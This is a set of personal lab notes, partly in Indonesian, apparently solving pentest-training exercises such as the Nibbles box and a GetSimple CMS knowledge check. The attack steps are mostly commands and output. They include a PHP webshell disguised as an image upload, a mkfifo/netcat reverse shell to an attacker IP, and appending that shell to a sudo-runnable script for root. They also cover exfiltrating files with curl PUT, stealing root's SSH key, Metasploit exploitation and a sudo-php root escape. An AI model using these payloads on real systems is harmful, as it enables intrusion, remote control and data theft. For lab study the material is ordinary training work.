# WEB REQUESTS 
## GET Method
Cari Authorization > decode > masukkan username dan password > /flag.php?num1&num2=1337
## POST Method
Temukan auth > decode > pangkas menjadi admin saja > encode > masukan ke GET request.
## PUT and DELETE Methods
```sh
PUT /flag.php HTTP/1.1
Host: 64.227.39.88:30829
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://64.227.39.88:30829/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 25

'<?=`cat /flag.txt`;?>'
```

```sh
DELETE /flag.txt HTTP/1.1
Host: 64.227.39.88:30829
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://64.227.39.88:30829/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

# JAVASCRIPT DEOBFUSCATION
## Source Code
Repeat what you learned in this section, and you should find a secret flag, what is it?
open the html
or 
view-source:http://178.62.99.180:30383/
## HTTP Requests
Try applying what you learned in this section by sending a 'POST' request to '/serial.php'. What is the response you get?
curl http://64.227.39.88:32005/serial.php -X POST
## Decoding
Using what you learned in this section, determine the type of encoding used in the string you got at previous exercise, and decode it. To get the flag, you can send a 'POST' request to 'serial.php', and set the data as "serial=YOUR_DECODED_OUTPUT".
```sh
curl -s http://64.227.39.89:31786/serial.php -X POST -d  "serial=$(curl -s http://64.227.39.89:31786/serial.php -X POST|base64 -d)"
```

## Skills Assessment
```sh
curl -s http://178.62.99.180:30113/keys.php -X POST -d "key=$(curl -s http://178.62.99.180:30113/keys.php -X POST | xxd -p -r)"
```
# GETTING STARTED
## Service Scanning
 Perform an Nmap scan of the target. What service is running on port 8080? (two words)
 ```sh
nmap -sV -sC 10.129.42.254 
 ```

List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file.
```sh
smbclient -N -L \\\\10.129.42.254\\users
smbclient  \\\\10.129.42.254\\users
smbclient -U bob  \\\\10.129.42.254\\users
```

```
get,cd,ls
```
## Web Enumeration
Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.
```sh
gobuster -u http://178.62.44.230:30819/ -w ~/Documents/File/SecLists/Discovery/Web-Content/URLs/urls-Drupal-7.20.txt 
```
## Public Exploits
Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)
```sh
msfconsole
```

```msf
search simple backup
use 0
options
set RHOSTS 178.62.99.162
set RPORT 31276
run
```

```sh
cat /home/wowon/.msf4/loot/20220213123810_default_178.62.99.162_simplebackup.tra_425837.txt
```

```msf
set FILEPATH /flag.txt
run
```

```sh
cat /home/wowon/.msf4/loot/20220213124301_default_178.62.99.162_simplebackup.tra_218096.txt
```

## Privilege Escalation
```sh
SSH to 178.62.99.162 with user "user1" and password "password1"
```
SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.
```sh
ssh user1@178.62.99.162 -p 31869
```

```sh
cd /home/user2
sudo -l
sudo -u user2 /bin/bas
cat flag.txt
```

```sh
cd /root/
cd .ssh/
cat id_rsa
```

copy the private key and ssh with it.
```sh
ssh root@178.62.99.162 -p 31869 -i id_rsa
cat flag.txt
```

## Nibbles - Enumeration
Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)
```sh
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190
```

## Nibbles - Initial Foothold
```sh
gobuster -u 10.129.200.170 -w /home/wowon/Documents/File/SecLists/Discovery/Web-Content/common.txt
```

```
http://10.129.200.170/nibbleblog/content/private/
```

```sh
curl http://10.129.200.170/nibbleblog/content/private/config.xml | xmllint --format -
curl http://10.129.200.170/nibbleblog/content/private/users.xml | xmllint --format -
```
publish in image extention
```php
<?php system("id"); ?>
```
output error php, bahwa php bisa di ekspoitasi
```error
**Warning**: imagesx() expects parameter 1 to be resource, boolean given in **/var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php** on line **26**  
  
**Warning**: imagesy() expects parameter 1 to be resource, boolean given in **/var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php** on line **27**  
  
**Warning**: imagecreatetruecolor(): Invalid image dimensions in **/var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php** on line **117**  
  
**Warning**: imagecopyresampled() expects parameter 1 to be resource, boolean given in **/var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php** on line **118**  
  
**Warning**: imagejpeg() expects parameter 1 to be resource, boolean given in **/var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php** on line **43**  
  
**Warning**: imagedestroy() expects parameter 1 to be resource, boolean given in **/var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php** on line **80**
```
open
```
http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php
```
output
```php
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

```php
<?php system("pwd"); ?>
```
output:
```
/var/www/html/nibbleblog/content/private/plugins/my_image
```

foothold
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.34 9443 >/tmp/f"); ?>
```

```sh
nc -lvnp 9443
```
upload > open > akan terkonek ke port 9443
### get bash with python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
to download the file
in your terminal
```sh
httpsweet
```
in target termial
```bash
curl -X PUT -T "personal.zip" "http://10.10.14.247:8000/"
```


## Nibbles - Privilege Escalation


```sh
unzip personal.zip
cd personal/stuff
chmod 700 monitor.sh
./monitor.sh
```
output:
```json
Internet:  Disconnected
Operating System Type : GNU/Linux
OS Name :Ubuntu
UBUNTU_CODENAME=xenial
OS Version :16.04.3 LTS (Xenial Xerus)
Architecture : x86_64
Kernel Release : 4.4.0-104-generic
Hostname : Nibbles
Internal IP : 10.129.183.121 dead:beef::250:56ff:feb9:9e79
External IP :  
Name Servers : DO 1.1.1.1 8.8.8.8
Logged In users :
Ram Usages :
              total        used        free      shared  buff/cache   available
Mem:           974M        225M        188M         10M        561M        566M
Swap Usages :
              total        used        free      shared  buff/cache   available
Swap:          1.0G          0B        1.0G
Disk Usages :
Filesystem                    Size  Used Avail Use% Mounted on
/dev/sda1                     472M  133M  330M  29% /boot
Load Average : average:0.00,0.00,
System Uptime Days/(HH:MM) : 37 min
```

### upload LinEnum.sh (optional)
```sh
sudo python3 -m http.server 8080
```
in target
```sh
wget http://10.10.14.34:8080/LinEnum.sh
./LinEnum.sh
```
out:
```sh
[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
```

### Append to vulnerable file
```sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.34 8443 >/tmp/f' | tee -a monitor.sh
```
in local
```sh
nc -lvnp 8443
```

```sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

## Knowledge Check
Spawn the target, gain a foothold and submit the contents of the user.txt flag.
```sh
nmap -sV -sC 10.129.181.121
```

```sh
gobuster -u 10.129.181.121 -w /home/wowon/Documents/File/SecLists/Discovery/Web-Content/common.txt -fw
```
output
```json
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.129.181.121/
[+] Threads      : 10
[+] Wordlist     : /home/wowon/Documents/File/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/02/16 16:56:12 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/backups (Status: 301)
/data (Status: 301)
/index.php (Status: 200)
/plugins (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
/sitemap.xml (Status: 200)
/theme (Status: 301)
=====================================================
2022/02/16 16:59:21 Finished
=====================================================
```

```r
robots.txt
http://10.129.181.121/admin/
```

```sh
whatweb http://10.129.181.121/admin/
```
out
```r
/usr/lib/ruby/vendor_ruby/target.rb:188: warning: URI.escape is obsolete
http://10.129.181.121/admin/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.181.121], JQuery[1.7.1], PasswordField[pwd], Script[text/javascript], Title[gettingstarted &raquo; Login], X-Frame-Options[SAMEORIGIN]
```

```
msfconsole
search getsimple
use 1
show options
set lhosts 10.10.14.34
set rhosts 10.129.181.121
check 
run
```
user.txt
```
7002d65b149b0a4d19132a66feed21d8
```

```
shell
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
check sudo vuln
```sh
sudo -l
```
out
```
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```
getinfo from https://gtfobins.github.io/gtfobins/php/
```sh
CMD="/bin/sh"
sudo php -r "system('$CMD');"
```
horay you are root
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


